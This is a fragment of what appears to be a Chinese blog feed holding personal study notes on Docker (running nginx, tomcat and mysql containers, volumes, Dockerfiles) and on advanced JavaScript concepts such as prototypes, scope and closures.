49 privatebin/nginx-fpm-alpine PrivateBin running on an Nginx, php-fpm &amp; Al… 47 [OK]nginxinc/nginx-unprivileged Unprivileged NGINX Dockerfiles 31 staticfloat/nginx-certbot Opinionated setup for automatic TLS certs lo… 19 [OK]schmunk42/nginx-redirect A very simple container to redirect HTTP tra… 19 [OK]nginx/nginx-prometheus-exporter NGINX Prometheus Exporter 16 centos/nginx-112-centos7 Platform for running nginx 1.12 or building … 15 centos/nginx-18-centos7 Platform for running nginx 1.8 or building n… 13 bitwarden/nginx The Bitwarden nginx web server acting as a r… 9 flashspys/nginx-static Super Lightweight Nginx Image 9 [OK]bitnami/nginx-ingress-controller Bitnami Docker Image for NGINX Ingress Contr… 8 [OK]mailu/nginx Mailu nginx frontend 8 [OK]navidonskis/nginx-php5.6 Docker nginx + php5.6 on Ubuntu 7 [OK]ansibleplaybookbundle/nginx-apb An APB to deploy NGINX 2 [OK]wodby/nginx Generic nginx 1 [OK] 下载nginx12345678910yangfan@yangfan-virtual-machine:~$ sudo docker pull nginx:1.18.0-alpine1.18.0-alpine: Pulling from library/nginx0a6724ff3fcd: Pull complete 1d7c87af3754: Pull complete 9668ffa91d19: Pull complete e81a2f5037c1: Pull complete 991b5ddb4d9e: Pull complete Digest: sha256:7ae8e5c3080f6012f8dc719e2308e60e015fcfa281c3b12bf95614bd8b6911d6Status: Downloaded newer image for nginx:1.18.0-alpinedocker.io/library/nginx:1.18.0-alpine 运行容器1234567891011121314yangfan@yangfan-virtual-machine:~$ sudo docker run --name nginx1 -d -p 3344:80 nginxUnable to find image 'nginx:latest' locallylatest: Pulling from library/nginxa076a628af6f: Already exists 0732ab25fa22: Pull complete d7f36f6fe38f: Pull complete f72584a26f32: Pull complete 7125e4df9063: Pull complete Digest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latest2cd5726333e7eadab428a788ad440c16d00af2aecc1010e4ead0b7878aa899cayangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2cd5726333e7 nginx "/docker-entrypoint.…" 9 seconds ago Up 8 seconds 0.0.0.0:3344-&gt;80/tcp 进入容器查看配置文件1234567891011yangfan@yangfan-virtual-machine:~$ sudo docker exec -it 2cd5726333e7 /bin/bashroot@2cd5726333e7:/# lsbin dev docker-entrypoint.sh home lib64 mnt proc run srv tmp varboot docker-entrypoint.d etc lib media opt root sbin sys usrroot@2cd5726333e7:/# whoamirootroot@2cd5726333e7:/# whwhereis which while who whoami root@2cd5726333e7:/# whereis nginxnginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginxroot@2cd5726333e7:/# cd /etc/nginx/ 安装tomcat官方的使用方式 docker run -it –rm tomcat:90 –rm 一般用来测试，用完就删除 下载镜像 12345678910111213141516yangfan@yangfan-virtual-machine:~$ sudo docker pull tomcatUsing default tag: latestlatest: Pulling from library/tomcatb9a857cbf04d: Pull complete d557ee20540b: Pull complete 3b9ca4f00c2e: Pull complete 667fd949ed93: Pull complete 661d3b55f657: Pull complete 511ef4338a0b: Pull complete a56db448fefe: Pull complete 00612a99c7dc: Pull complete 326f9601c512: Pull complete c547db74f1e1: Pull complete Digest: sha256:94cc18203335e400dbafcd0633f33c53663b1c1012a13bcad58cced9cd9d1305Status: Downloaded newer image for tomcat:latestdocker.io/library/tomcat:latest 运行镜像 12345678910111213yangfan@yangfan-virtual-machine:~$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmysql 5.7 a70d36bc331a 6 weeks ago 449MBtomcat 9.0 040bdb29ab37 7 weeks ago 649MBtomcat latest 040bdb29ab37 7 weeks ago 649MBnginx latest f6d0b4767a6c 7 weeks ago 133MBnginx 1.18.0-alpine f2343e2e2507 2 months ago 21.9MBcentos latest 300e315adb2f 2 months ago 209MByangfan@yangfan-virtual-machine:~$ sudo docker run -d -p 3344:8080 --name tomcat1 tomcat b90a6472737fe5d319b4afad7d360a3e6394dd08fb0991bc27751c99e30b1712yangfan@yangfan-virtual-machine:~$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb90a6472737f tomcat "catalina.sh run" About a minute ago Up About a minute 0.0.0.0:3344-&gt;8080/tcp tomcat1 docker stats 容器id 查看cpu状态 12CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDSeaee03688881 mysql02 0.08% 204.6MiB / 2.895GiB 6.90% 12.1kB / 20.3kB 26.7MB / 292MB 32 Commit镜像docker commit 提交容器成为一个新的副本 docker commit -m=”提交的描述信息” -a=”作者” 容器id 目标镜像名[:TAG] 12345678fany@ubuntu18:~$ sudo docker commit -m="commit版centos" -a="fany" 1e7b39c3c2da fany/centos:2.0 sha256:7396d029926a4f5ba6b9f82e5172666ae63b60cd0b53fd9f607798052bd3a05bfany@ubuntu18:~$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEfany/centos 2.0 7396d029926a 5 seconds ago 209MBfany/centos 1.0 13da2d456cd9 38 hours ago 209MBmysql 5.7 a70d36bc331a 7 weeks ago 449MBcentos latest 300e315adb2f 3 months ago 209MB 容器数据卷使用数据卷docker run -it -v 主机目录：容器内目录 把主机目录挂载到容器目录中 使用数据卷实战：安装mysql下载mysql1docker pull mysql 运行mysql12# 官方mysql运行测试命令docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag 12345678docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7# -d 后台运行-p 端口映射-v 挂载（就是docker主机和主机之间的文件相互同步）-e 添加配置--name 别名 具名和匿名挂载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 匿名挂载-v 容器内路径docker run -d -P --name nginx01 -v /etc/nginx nginxfany@ubuntu18:~$ sudo docker run -d -P --name nginx01 -v /etc/nginx/ nginxUnable to find image 'nginx:latest' locallylatest: Pulling from library/nginxa076a628af6f: Already exists 0732ab25fa22: Pull complete d7f36f6fe38f: Pull complete f72584a26f32: Pull complete 7125e4df9063: Pull complete Digest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latest2156646a24e3b8515ad3cb295e3188a7f06d5da7d7d6d286e47e33a53fdff665# 查看所有的volume的情况docker volume lsfany@ubuntu18:~$ sudo docker volume lsDRIVER VOLUME NAMElocal 1aace1413a58fe48b59552be0e13f258fc2625389c358dc63f0fa61023af7264local 2e6cf97c31fa74eb56fbecf7467b0eeebc85286c2d0b73324f7431f3e339a4aclocal 5ac0f89b61aad729335646a84d938d45072bebaadb5446e638311d8b78f1ae09local 6eb06715d487effeab344c9a335940e522a3c95c89dce0363b93aa30b45d320flocal 9ce9dca7966653ba788bd8c7a79444d3a7fd533f89e3d97da0bb2eabf5d20328local 9d1e8bfccadc28cd3048078e743e139183eb1fee78759e3bbb4170394e5d473flocal 9d8414a8ce53ef619a12bde9abfadbc3937565d566dd63e1d72d61ba3771a48blocal 44a91fa46dd5003a31c9123b8bbe1d43deb4933a6503c84ce17b11eaf0d5b769local 90d2f411f4eb4d6bd903f4ceac1d6ab57ba557b08db220414aa28bda734da62flocal 2906a33e43e822a758130a9a8ae37c2dc31cb9aa1dde45969a0a43819cc48c20local 3871f7c9892d84ce47c536a3ad810b3dcea7f3aecb9ce0c8ae66490c3f84ebaflocal 6058f80c65d9dd81f29975267e5f1eadee371c3ae2673828452757502550a19flocal 216203260f3961bd642a69622c97b9abf6b87172c28ee20048b4fae26c3e806alocal a52876a9d6f8a6556d3bf3835c0d92a0bc3853ace46843bd685241033ab14a56local b60310b05c6bfa2a9ed0619264f0c8db7d5beab25c8ad132d981507c5f8b2180local d6fd04629f90fa33f8ae877cfcf9a2ae55e39c0f6f71c9b58c0692c435aeb004local e1ea3b10c4e43b47452a9183537115a67ebac455a17530ed3df18fda2c1f5cb9local f9fff3462e30f18f4f85d4c0d9d50ee02f5b0909ed22b79d7e6b9e638b386408# 这里发现，这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径sudo# 具名挂载docker run -d -P --name nginx02 -V juming-nginx:/etc/nginx nginxdocker volume lsfany@ubuntu18:~$ sudo docker volume lsDRIVER VOLUME NAMElocal 1aace1413a58fe48b59552be0e13f258fc2625389c358dc63f0fa61023af7264local 2e6cf97c31fa74eb56fbecf7467b0eeebc85286c2d0b73324f7431f3e339a4aclocal 5ac0f89b61aad729335646a84d938d45072bebaadb5446e638311d8b78f1ae09local 6eb06715d487effeab344c9a335940e522a3c95c89dce0363b93aa30b45d320flocal 9ce9dca7966653ba788bd8c7a79444d3a7fd533f89e3d97da0bb2eabf5d20328local 9d1e8bfccadc28cd3048078e743e139183eb1fee78759e3bbb4170394e5d473flocal 9d8414a8ce53ef619a12bde9abfadbc3937565d566dd63e1d72d61ba3771a48blocal 44a91fa46dd5003a31c9123b8bbe1d43deb4933a6503c84ce17b11eaf0d5b769local 90d2f411f4eb4d6bd903f4ceac1d6ab57ba557b08db220414aa28bda734da62flocal 2906a33e43e822a758130a9a8ae37c2dc31cb9aa1dde45969a0a43819cc48c20local 3871f7c9892d84ce47c536a3ad810b3dcea7f3aecb9ce0c8ae66490c3f84ebaflocal 6058f80c65d9dd81f29975267e5f1eadee371c3ae2673828452757502550a19flocal 216203260f3961bd642a69622c97b9abf6b87172c28ee20048b4fae26c3e806alocal a52876a9d6f8a6556d3bf3835c0d92a0bc3853ace46843bd685241033ab14a56local b60310b05c6bfa2a9ed0619264f0c8db7d5beab25c8ad132d981507c5f8b2180local d6fd04629f90fa33f8ae877cfcf9a2ae55e39c0f6f71c9b58c0692c435aeb004local e1ea3b10c4e43b47452a9183537115a67ebac455a17530ed3df18fda2c1f5cb9local f9fff3462e30f18f4f85d4c0d9d50ee02f5b0909ed22b79d7e6b9e638b386408local juming-nginx 所有的docker容器内的卷，没有指定目录的情况下都是在 /var/lib/docker/volumes/xxx/_data 我们通过具名挂载可以方便的找到我们的一个卷，大多数情况在使用具名挂载 1234# 区分匿名挂载/具名挂载还是指定路径挂载-v 容器内路径 # 匿名挂载-v 卷名:容器内路径 # 具名挂载-v /宿主机路径:容器内路径 # 指定路径挂载 扩展： -v /宿主机路径:容器内路径 12345678# 通过 -V 容器内路径：ro rw 改变读写权限ro readonly # 只读rw readwrite # 可读可写# 一旦这个设置了容器权限 容器对我们挂载出来的内容就有限定了docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginxdocker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx# ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部都无法操作 初始Dockerfiledockerfile 就是用来构建 docker镜像的构建文件，命令脚本 通过这个脚本可以生成镜像，镜像是一层一层的，脚本一个个的命令，每个命令都是一层 1234567# 创建一个dockerfile文件 名字可以随机 建议dockerfile# 文件中的内容 指令（大写） 参数FROM centosVOLUME [&apos;volume01&apos;, &apos;volume02&apos;]CMD echo &quot;-----end-----&quot;CMD /bin/bash# 这里的每个命令，都是镜像的一层 执行 1docker build -f /home/dockerfile1 -t 作者名/镜像名：版本 . 123456789101112131415161718fany@ubuntu18:~/docker/DockerFile$ sudo docker build -f /home/fany/docker/DockerFile/dockerfile -t fany/centos:1.0 .Sending build context to Docker daemon 2.048kBStep 1/4 : FROM centos ---&gt; 300e315adb2fStep 2/4 : VOLUME ['volume01', 'volume02'] ---&gt; Running in ac6ee9ac88e2Removing intermediate container ac6ee9ac88e2 ---&gt; 28fabf1af5a9Step 3/4 : CMD echo "----end----" ---&gt; Running in 107be8d1d71aRemoving intermediate container 107be8d1d71a ---&gt; 246ba60efd5bStep 4/4 : CMD /bin/bash ---&gt; Running in d94e1416d4b9Removing intermediate container d94e1416d4b9 ---&gt; 13da2d456cd9Successfully built 13da2d456cd9Successfully tagged fany/centos:1.0 数据卷容器docker run -it –name docker01 –volumes-from docker01 作者名/镜像名：版本 通过以上的方式我们可以实现容器间的数据共享 任何一个容器被删除，共享的数据不会丢失 多个mysql实现数据共享 1234567891011121314151617181920212223242526docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7fany@ubuntu18:~$ sudo docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 mysql:5.7 eaee03688881f1c55d76642cf83518d862fe6ea5239d32ac7048628cfb44778adocker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7# 测试结果fany@ubuntu18:~$ sudo docker exec -it eaee03688881 /bin/bashroot@eaee03688881:/# cd /var/lib/mysqlroot@eaee03688881:/var/lib/mysql# lsauto.cnf client-cert.pem ib_logfile0 ibtmp1 private_key.pem server-key.pemca-key.pem client-key.pem ib_logfile1 mysql public_key.pem sysca.pem ib_buffer_pool ibdata1 performance_schema server-cert.pem testfany@ubuntu18:~$ sudo docker start a3a15fbd16a3a3a15fbd16a3fany@ubuntu18:~$ sudo docker exec -it a3a15fbd16a3 /bin/bashroot@a3a15fbd16a3:/# cd /var/lib/mysqlroot@a3a15fbd16a3:/var/lib/mysql# lsauto.cnf client-cert.pem ib_logfile0 ibtmp1 private_key.pem server-key.pemca-key.pem client-key.pem ib_logfile1 mysql public_key.pem sysca.pem ib_buffer_pool ibdata1 performance_schema server-cert.pem test# 在eaee03688881容器中新建了test数据库 a3a15fbd16a3 也同步了test数据库 结论： 容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止。 但是一旦持久化到了本地，这个时候，本地的数据是不会删除的。 DockerFiledockerfile介绍dockerfile构建过程dockerfile的指令123456789101112FROM # 基础镜像，一切从这里开始构建MEINTAINER # 镜像是谁写的， 姓名+邮箱RUN # 镜像构建的时候需要运行的命令ADD # 步骤：tomcat镜像，这个tomcat压缩包 添加内容COPY # 类似ADD，将lsWORKDIR # 镜像的工作目录VOLUME # 挂载的目录EXPOST # 保留端口配置yumCMD # 指定容器启动的时候需要运行的命令 替换ENTRYPIOINT # 指定这个容器启动的时候要运行的命令 追加ONBUILE # 当构建一个被继承 DockerFile 这个时候就会运行 ONBUILD的指令，触发指令。ENV # 构建的时候设置环境变量 实战测试：centos 创建一个自己的centos 12345678910111213141516171819202122232425262728# 1 编写DockerFile配置文件FROM centosMAINTAINER fany&lt;483813121@qq.com&gt;ENV MYPATH /usr/localWORKDIR $MYPATHRUN yum -y install vim RUN yum -y install net-toolsEXPOSE 80CMD echo $MYPATHCMD echo "----end----"CMD /bin/bash# 2、通过这个文件 构建镜像# 命令 docker build -f dockerfile文件路径 -t 镜像名：[tag] .构建成功后显示Successfully built 镜像idSuccessfully tagged 镜像名:tag# 3、运行测试fany@ubuntu18:~/docker/DockerFile$ sudo docker run --name centos03 -it 2eee339e854a[root@28ffb5be051d local]# lsbin etc games include lib lib64 libexec sbin share src 列出本地进行的变更历史镜像命令 docker history 镜像id 1234567891011121314fany@ubuntu18:~/docker/DockerFile$ sudo docker history 2eee339e854aIMAGE CREATED CREATED BY SIZE COMMENT2eee339e854a 7 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/bin… 0B 328c5590083f 7 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "echo… 0B 61c489975a32 7 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "echo… 0B 4775afd52615 7 minutes ago /bin/sh -c #(nop) EXPOSE 80 0B 2d4e54be3fdd 7 minutes ago /bin/sh -c yum -y install net-tools 23.3MB 2210b82a2fd3 7 minutes ago /bin/sh -c yum -y install vim 58MB 8ad9663738ee 8 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0B 9e5baf54c101 8 minutes ago /bin/sh -c #(nop) ENV MYPATH=/usr/local 0B 7ca038e36aec 8 minutes ago /bin/sh -c #(nop) MAINTAINER fany&lt;483813121… 0B 300e315adb2f 3 months ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:bd7a2aed6ede423b7… 209MB CMD 和 ENTRYPOINT 区别 12CMD # 指定容器启动的时候需要运行的命令 替换ENTRYPIOINT # 指定这个容器启动的时候要运行的命令 追加 实战测试：Tomcat镜像1、准备镜像文件 tomcat压缩包，jdk的压缩包 2、编写dockerfile文件，官方命名Dockerfile 12345678910111213141516171819202122FROM centosMAINTAINER fany&lt;483813121@qq.com&gt;COPY readme.txt /usr/local/readme.txtADD jdk-8u11-linux-x64.tar.gz /usr/local/ADD apache-tomcat-9.0.22.tar.gz /usr/local/RUN yum -y install vimENV MYPATH /usr/localWORKDIR $MYPATHENV JAVA_HOME /usr/local/jdk1.80_11ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.22ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.0.22/bin/logs/catalina.out 3、构建镜像 1# docker build -f diytomcat 4、启动镜像 5、访问测试 6、发布项目 发布自己的镜像https://homenew.console.aliyun.com/home/dashboard/ProductAndService 阿里云的容器镜像服务 DocKer网络]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript高级笔记]]></title>
    <url>%2F2020%2F08%2F31%2FJavascript%E9%AB%98%E7%BA%A7%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JS高级学习笔记基础总结深入理解数据类型1. 分类 基本(值)类型 String: 任意字符串 Number: 任意的数字 Boolean: true/false undefined: undefined null: null 对象(引用)类型 Object: 任意类型 Function: 一种特别的对象(可以执行) Array: 一种特别的对象(对象下标) 2. 判断 如何判断数据类型? typeof instanceof === 相关问题 undefined与null的区别? undefined代表定义未赋值null定义并赋值了，只是值为null 什么时候给变量赋值为null呢? 初识赋值，表示将要赋值为对象结束前,让对象成为垃圾对象(被垃圾回收器回收) 严格区别变量类型与数据类型? 数据的类型 基本类型 对象类型 变量的类型(变量内存值的类型) 基本类型: 保存就是基本类型的数据 引用类型: 保存的是地址值 数据_变量_内存1. 什么是数据? 存储在内存中代表特定信息的’玩意’,本质是以0101形式存储 数据的特点 可传递 可运算 哲学思想 一切皆数据 内存中操作的目标 就是操作数据 数据能进行哪些操作? 算术运算 赋值 逻辑运算 运行函数 2. 什么是内存? 内存条通电后产生的可存储数据的空间(临时的) 内存的产生和死亡 内存条(一块电路板) -&gt; 通电 -&gt; 产生内存空间 -&gt; 存储数据 -&gt; 处理数据 -&gt; 断电 -&gt; 内存空间和数据都消失 一块小内存的2个数据 内部存储的数据 地址值 内存分类 栈: 存储 全局变量/局部变量 堆: 存储 对象 3. 什么是变量? 可变化的量,由变量名和变量值组成 每个变量都对应的一块小内存,变量名用来查找对应的内存,变量值就是内存中保存的数据 4. 内存,数据,变量三者之间的关系? 内存用来存储数据的空间 变量是内存的标识 关于赋值和内存的问题 var a = xxx, a内存中到底保存的是什么? xxx是基本数据,保存的就是这个数据 xxx是对象, 保存的就是对象的地址值 xxx是一个变量, 保存的xxx的内存内容(可能是基本数据, 也可能是地址值) 关于引用变量赋值问题 2个引用变量指向同一对象, 通过一个变量修改对象内部数据, 另一个变量看到的是修改之后的数据 123456789101112// 2个引用变量指向同一个对象var obj1 = &#123;name: 'tom'&#125;;var obj2 = obj1;// 通过一个变量修改对象内部数据obj1.name = 'Jack';// 另一个变量看到的是修改之后的数据console.log(obj2.name) //Jackfunction fn(obj)&#123; obj.name = 'Dock';&#125;fn(obj1);console.log(obj2.name); //Dock 2个引用变量指向同一个对象, 让其中一个引用变量指向另一个对象, 另一个引用变量依然指向前一个对象 12345678// 2个引用变量指向同一个对象var a = &#123;age: 12&#125;;var b = a;// 让其中一个引用变量指向另一个对象a = &#123;name: 'BoB', age: 13&#125;;b.age = 14;// 另一个引用变量依然指向前一个对象console.log(b.age, a.name, a.age); //12 'BoB' 13 在JS调用函数时传递变量参数时, 是值传递还是引用传递 理解1: 都是值(基本/地址值)传递 理解2: 可能是值传递, 也可能是引用传递(地址值) 1234567var a = 3;// 实参a 传递 给形参a 肯定是值传递 形参a 是局部变量 值改变不会影响外部的变量afunction fn (a) &#123; a = a + 1;&#125;fn(a);console.log(a); JS引擎如何管理内存? 内存生命周期 分配小内存空间, 得到它的使用权 存储数据, 可以反复进行操作 释放小内存空间 释放内存 局部变量: 函数执行完自动释放 对象: 成为垃圾对象 -&gt; 垃圾回收器回收 对象 什么是对象? 多个数据的封装体 用来保存多个数据的容器 一个对象代表现实中的一个事物 为什么要用对象? 统一管理多个数据 对象的组成 属性 属性名(字符串)和属性值(任意)组成 方法 一种特别的属性(属性值是函数) 如何访问对象内部数据? .属性名 编码简单,有时不能用 [] 编码麻烦,能通用 什么时候必须使用[&#39;属性名&#39;]的方式? 属性名包含特殊字符: - 空格 变量名不确定 函数了解函数 什么是函数? 实现特定功能的n条语句的封装体 只有函数是可以执行的, 其他类型的数据不能执行 为什么要用函数? 提高代码复用 便于封装 函数的核心思想 封装 如何定义函数? 函数声明 表达式 如何调用(执行)函数? test() : 直接调用 obj.test() : 通过对象调用 new.test() : new调用 test.call/apply(obj) : 临时让test成为obj的方法进行调用 回调函数 什么函数才是回调函数? 你定义的 你没有掉，但最终它执行了 常见的回调函数? dom事件回调函数 定时器回调函数 ajax请求回调函数 生命周期回调函数 1&lt;button id='btn'&gt;测试点击事件&lt;/button&gt; 12345678// dom事件回调函数document.getElementById('btn').onclick = function()&#123; alert(this.innerHTML);&#125;// 定时回调函数setTimeout(function()&#123; alert("我是定时器回调函数");&#125;, 2000); IIFE(立即调用函数表达式) 理解 全称: Immediately-Invoked Function Expression 中文解释: 立即调用的函数表达式 作用 隐藏实现 不会污染外部(全局)命名空间 用它来编写js模块 1234567891011121314151617181920212223// 匿名函数自调用// 这样写不会污染(全局)命名空间function()&#123; var a = 3; console.log(a + 3);&#125;()// 与匿名函数中的a 不是同一个avar a = 4;console.log(a);;function()&#123; var a = 1; function test()&#123; console.log(++a); &#125; // 这样写是向外暴露一个全局函数 window.$ = function()&#123; return &#123; test: test &#125; &#125;&#125;()$().test(); 函数中的this this是什么? 任何函数本质上都是通过某个对象来调用的, 如果没有直接指定的就是window 所有函数内部都有一个变量this 它的值是调用函数的当前对象 自己的理解 this其实就是函数的调用者, 可能是window,可能是某个对象 如何确定this的值? test() : window p.test() : p new test() : 新创建的对象 p.call(obj) : obj 总结 数据类型：两大类基本类型(值): String Number Boolean undefined null对象类型(引用): Object Function(可以执行) Array(有序)判断数据类型的方法(3种)typeof(返回数据类型名, 不能区别null、对象和数组)instanceof(返回true/false, 专门用来判断Object、Array、Function)===(返回true/false, 只能判断undefined和null) 数据是存储在内存中代表特定信息的东西内存是通电后临时产生可存储数据的空间变量是可变化的量, 变量以及变量的值会以数据的形式保存到内存中 对象是多个数据的封装体 函数是实现特定功能的n条语句的封装体 回调函数是自己定义, 没有调用却执行了的特殊函数 IIFE 立即调用函数表达式 this代表函数的调用者 函数高级(重点内容)原型与原型链原型 函数的prototype属性 函数都有prototype属性，默认指向一个Object空对象(既称为原型对象),每个原型对象中有一个属性constructor,它指向函数对象 给原型对象添加属性(一般是方法) 作用：函数的所有实例对象自动拥有原型中的属性(方法) 显式原型与隐式原型 每个函数function都有一个prototype, 既显式原型(属性) 每个实例对象都有一个proto, 可称为隐式原型(属性) 对象的隐式原型的值为其对应构造函数的显式原型的值 总结函数的prototype属性: 在定义函数时自动添加的,默认值是一个空Object对象对象的__proto__属性: 创建对象时自动添加的, 默认值为构造函数的prototype属性值程序员能直接操作显式原型,但不能直接操作隐式原型(ES6之前) 原型链 说明 访问一个对象的属性时，先在自身属性中查找,找到返回,如果没有,则沿着__proto__这条链向上查找,找到返回,如果最终没有找到,返回undefined 别名: 隐式原型链 作用 查找对象的属性(方法) 理解原型链的三个基本点 函数的显式原型指向的对象默认是空Object实例对象(但Objec不满足) 所有函数都是Function的实例(包含Function) Object的原型对象是原型链的尽头 原型链_属性问题 读取对象属性值时: 会自动到原型链中查找 设置对象属性值时: 不会查找原型链, 如果当前对象中没有此属性,直接添加此属性并设置其值 方法一般定义在原型中, 属性一般通过构造函数定义在对象本身内 instanceof instanceof是如何判断的? 表达式: A instanceof B 如果B函数的显式原型对象在A对象的原型链上, 返回true, 否则返回false Function是通过new自己产生的实例 执行上下文与执行上下文栈变量提升与函数提升 变量声明提升 通过var定义(声明)的变量, 在定义语句之前就可以访问到 值为undefined 函数声明提升 通过function声明的函数, 在之前就可以直接调用 值为函数定义(对象) 总结一句话就是变量定义前可以使用变量,但值 为undefined 执行上下文(帮助理解内部是如何执行的) 代码分类(位置) 全局代码 函数(局部)代码 全局执行上下文(流程) 在执行全局代码前将window确定为全局执行上下文 对全局数据进行预处理 var定义的全局变量==&gt;undefined,添加为window的属性 将var定义的变量作为添加到window中 function声明的全局函数==&gt;赋值(fun), 添加为window的方法 将function声明的函数作为方法添加到window中 this==&gt;赋值(window) 最后才开始执行全局代码 函数执行上下文(流程) 在调用函数,准备执行函数体之前,创建对应的函数执行上下文对象(虚拟的,存在与栈中) 对局部数据进行预处理 形参变量==&gt;赋值(实参)==&gt;添加为执行上下文的属性 arguments==&gt;赋值(实参列表),添加为执行上下文的属性 var定义的局部变量==&gt;undefined,添加为执行上下文的方法 this==&gt;赋值(调用函数的对象) 最后才开始执行函数体代码 执行上下文栈 在全局代码执行前,JS引擎就会创建一个栈来存储管理所有的执行上下文对象 在全局执行上下文(window)确定后,将其添加到栈中(压栈) 在函数执行上下文创建后,将其添加到栈中(压栈) 在当前函数执行完后,将栈顶的对象移出(出栈) 所有的代码执行完后,栈中只剩下window ![](F:\素材整理\素材库.library\images\KCKGAPGDU5S33.info[译] 理解 JavaScript 中的执行上下文和执行栈 - 掘金_thumbnail.png) 作用域与作用域链作用域 什么是作用域? 就是一块”地盘”,一个代码段所在的区域 特点：它是静态的(相当于上下文对象),在编写代码时就确定了 作用域分类 全局作用域 函数作用域 块作用域(ES6存在) 作用域的作用 隔离变量，不同作用域下同名变量不会有冲突 作用域与执行上下文 作用域与执行上下文的区别 区别一 全局作用域之外,每个函数都会创建自己的作用域,作用域在函数定义时就已经确定了。而不是在函数调用时 全局执行上下文环境是在全局作用域确定之后,js代码马上执行之前创建 函数执行上下文是在调用函数时,函数体代码执行之前创建 区别二 作用域是静态的,只要函数定义好了就一直存在,且不会再变化 执行上下文是动态的,调用函数时创建,函数调用结束时就会自动释放 作用域与执行上下文的联系 执行上下文(对象)是从属于所在的作用域 全局上下文环境==&gt;全局作用域 函数上下文环境==&gt;对应的函数使用域 作用域链 什么是作用域链? 多个上下级关系的作用域形成的链,它的方向是从下向上的(从内到外) 查找变量时就是沿着作用域链来查找的 查找一个变量的查找规则 在当前作用域下的执行上下文中查找对应的属性,如果有直接返回,否则进入2 在上一级作用域的执行上下文中查找对应的属性,如果有直接返回,否则进入3 再次执行2的相同操作,直到全局作用域,如果还找不到就抛出找不到的异常 闭包了解闭包 如何产生闭包? 当一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量(函数)时,就产生了闭包 闭包是什么? 闭包是嵌套的内部函数 包含被引用变量(函数)的对象 注意: 闭包存在于嵌套的内部函数中 产生闭包的条件? 函数嵌套 内部函数引用了外部函数的数据(变量/函数) 1234567891011function fn1() &#123; var a = 2; function fn2() &#123;//产生了闭包 a++; console.log(a); &#125; return fn2&#125;var f = fn1();f() // 3f() // 4 闭包的作用 使用函数内部的变量在函数执行完厚,仍然存活在内存中(延长了局部变量的生命周期) 让函数外部可以操作(读写)到函数内部的数据(变量/函数) 闭包的生命周期 产生 在嵌套内部函数定义执行完时就产生了(不是在调用) 死亡 在嵌套的内部函数成为垃圾对象时 闭包的应用 定义JS模块 具有特定功能的js文件 将所有的数据和功能都封装在一个函数内部(私有的) 只向外暴露一个包含n个方法的对象或函数 模块的使用者,只需要通过模块暴露的对象调用方法来实现对应的功能 闭包的缺点以及如何解决 缺点 函数执行完厚,函数内的局部变量没有释放,占用内存时间会变长 容易造成内存泄漏 解决 能不用闭包就不用闭包 及时释放 变量 = null 内存溢出与内存泄露 内存溢出 一种程序运行出现的错误 当程序运行需要的内存超过了剩余的内存时, 就出抛出内存溢出的错误 内存泄露 占用的内存没有及时释放 内存泄露积累多了就容易导致内存溢出 常见的内存泄露: 意外的全局变量 没有及时清理的计时器或回调函数 闭包 总结 原型分为显式原型和隐式原型 每个函数都有一个prototype,也就是显式原型 每个实例对象都有一个__proto__，也就是隐式原型 实例对象的隐式原型的值等于构造函数的显式原型的值 原型链：通过隐式原型查找属性或方法的一条路径,Object的原型对象是原型链的尽头 原型链属性问题：读取对象属性或方法时才会查找原型链,设置时则不会 A instanceof B B函数的显式原型对象在A对象的原型链上，返回true，否则返回false 变量声明提升：通过var声明的变量, 在执行语句前,就会保存到window对象中，只是没有赋值 函数声明提升：通过function声明的函数,在声明语句前就可以调用 执行上下文：当前javascript代码被解析和执行时所在的环境的抽象概念 特点：动态生成 调用函数时就会自动生成一个执行上下文 结束时会自动销毁 作用域：一个代码所在区域 